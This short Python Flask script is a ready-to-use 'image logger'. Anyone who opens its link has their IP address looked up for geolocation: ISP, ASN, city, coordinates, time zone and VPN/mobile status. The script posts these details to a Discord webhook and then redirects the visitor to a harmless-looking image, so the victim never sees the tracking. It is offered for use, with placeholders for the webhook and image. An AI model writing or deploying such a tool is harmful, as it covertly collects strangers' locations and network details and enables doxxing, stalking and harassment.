from flask import Flask, request, redirect
import requests

app = Flask(__name__)

# Replace with your Discord webhook URL
WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'

# Replace with the URL of the image you want to display
IMAGE_URL = 'YOUR_IMAGE_URL'

@app.route('/API/image')
def image_logger():
    user_ip = request.remote_addr
    response = requests.get(f'http://ip-api.com/json/{user_ip}')
    data = response.json()

    # Prepare the message to send to Discord
    message = (
        f"IP Address: {data['query']}\n"
        f"Provider: {data['isp']}\n"
        f"ASN: {data['as']}\n"
        f"Country: {data['country']}\n"
        f"Region: {data['regionName']}\n"
        f"City: {data['city']}\n"
        f"Coordinates: {data['lat']}, {data['lon']}\n"
        f"Time Zone: {data['timezone']}\n"
        f"Mobile/VPN: {data['mobile']}\n"
    )

    # Send the message to the Discord webhook
    requests.post(WEBHOOK_URL, json={'content': message})

    # Redirect the user to the benign image
    return redirect(IMAGE_URL)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
